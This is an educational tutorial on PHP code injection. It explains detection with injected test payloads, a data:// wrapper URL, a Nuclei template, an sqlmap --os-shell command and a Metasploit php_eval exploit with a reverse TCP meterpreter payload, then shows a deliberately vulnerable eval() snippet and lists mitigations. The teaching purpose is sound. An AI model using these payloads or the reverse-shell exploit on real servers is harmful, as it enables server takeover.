## PHP Code Injection?

PHP Code Injection is a vulnerability that allows an attacker to execute arbitrary PHP code on a server by injecting malicious input. This usually happens when **user input is improperly handled** and passed to functions like `eval()`, `system()`, `exec()`, or `include()`.

### How It Works

An attacker can manipulate input parameters to execute unintended PHP commands, leading to:

- Data leakage (accessing sensitive files)
- System command execution (gaining control of the server)
- Complete server compromise

### How to detect the vulnerability

### **Manual PHP Code Injection Detection**  
PHP code injection occurs when user input is executed as PHP code due to insufficient input validation. Here’s how you can detect it manually:

#### **1. Input-Based Testing**  
Try injecting PHP code into input fields, URLs, or HTTP headers. Some common test payloads:  
```php
<?php phpinfo(); ?>
<?= system('id'); ?>
<?php echo shell_exec('ls -la'); ?>
```
- If the output reveals system details or command execution, the application is vulnerable.

#### **2. Observing Unexpected Behavior**  
- If a PHP syntax error appears in the response, it might indicate code injection.  
- If the application behaves unexpectedly (e.g., long response times), it might be executing injected code.

#### **3. Testing with File Inclusion**  
If the application includes files dynamically, try injecting:  
```
http://example.com/index.php?page=data://text/plain,<?php system('id'); ?>
```
This abuses PHP’s `data://` wrapper to execute code.

#### **4. Checking for Log or Eval Execution**  
- If user input is logged and later evaluated (`eval`, `assert`, `preg_replace('/.*/e', ...)`), injecting PHP code into logs could lead to execution.

---

### **Automated PHP Code Injection Detection**  
Automation helps speed up testing and ensures broader coverage. Some tools include:

#### **1. Burp Suite (Intruder & Scanner)**  
- Use Burp Intruder to inject PHP payloads in various parameters.  
- Burp’s Active Scanner can detect potential PHP code execution vulnerabilities.

#### **2. Nuclei (Automation Framework)**  
Use **Nuclei** with a PHP injection template to scan multiple endpoints:  
```yaml
id: php-code-injection  
info:  
  name: PHP Code Injection  
  severity: high  
requests:  
  - method: GET  
    path:  
      - "{{BaseURL}}/vulnerable.php?param=<?php system('id'); ?>"  
    matchers:  
      - type: word  
        part: body  
        words:  
          - "uid="  
```
Run it with:  
```bash
nuclei -t php-code-injection.yaml -u http://example.com
```

#### **3. SQLmap (For PHP Code Execution via SQL Injection)**  
If an application is vulnerable to SQL injection, SQLmap can be used for RCE:  
```bash
sqlmap -u "http://example.com/index.php?id=1" --os-shell
```

#### **4. Metasploit (PHP Code Injection Exploit)**  
```bash
use exploit/multi/http/php_eval
set RHOSTS target.com
set PAYLOAD php/meterpreter/reverse_tcp
exploit
```

#### **5. WPScan (For WordPress PHP Injection)**  
If testing a WordPress site, WPScan can check for PHP execution vulnerabilities:  
```bash
wpscan --url http://example.com --enumerate vp
```



### Example of PHP Code Injection Vulnerability

A poorly secured script might include:

```
if (isset($_GET['cmd'])) {
    eval($_GET['cmd']); // ⚠ Vulnerable to code injection
}
 
```

An attacker could execute:

```
http://127.0.0.1/phpcode.php?cmd=phpinfo()](http://example.com/vuln.php?cmd=phpinfo()) 
```

or even execute system commands if `eval()` allows it:

```
http://127.0.0.1/phpcode.php?cmd=system('ls');
```

### **Mitigation Strategies**

To prevent PHP Code Injection:

 - **Avoid `eval()` and similar functions**

 - **Use allowlists** (Only permit specific commands)

 - **Sanitize and validate input**

 - **Use prepared statements for database queries**

 - **Disable dangerous PHP functions in `php.ini`**

 - **disable exec(), shell_exec(), passthru(), and system() functions in PHP configuration unless it is absolutely necessary to use them. You can also create a whitelist of accepted commands/arguments.**
